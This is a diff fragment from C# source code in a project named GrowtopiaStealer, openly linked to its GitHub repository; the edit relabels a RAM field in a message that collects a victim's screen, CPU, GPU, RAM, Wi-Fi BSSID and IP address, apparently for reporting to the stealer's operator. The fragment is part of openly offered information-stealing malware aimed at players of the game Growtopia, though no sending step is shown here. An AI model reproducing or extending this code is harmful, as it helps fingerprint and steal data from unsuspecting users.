@@ -122,7 +122,7 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                                "\n```Screen Metrics: " + SystemInfo.ScreenMetrics() + "```" +
                                "\n```CPU: " + SystemInfo.GetCPUName() + "```" +
                                "\n```CPU: " + SystemInfo.GetGpuName() + "```" +
-                               "\n```CPU: " + SystemInfo.GetRAM() + "```" +
+                               "\n```RAM: " + SystemInfo.GetRAM() + "```" +
                                "\n```BSSID: " + BSSID.GetBSSID() + "```" +
                                "\n ================================" +
                                "\n```IP: " + IP + "```" +
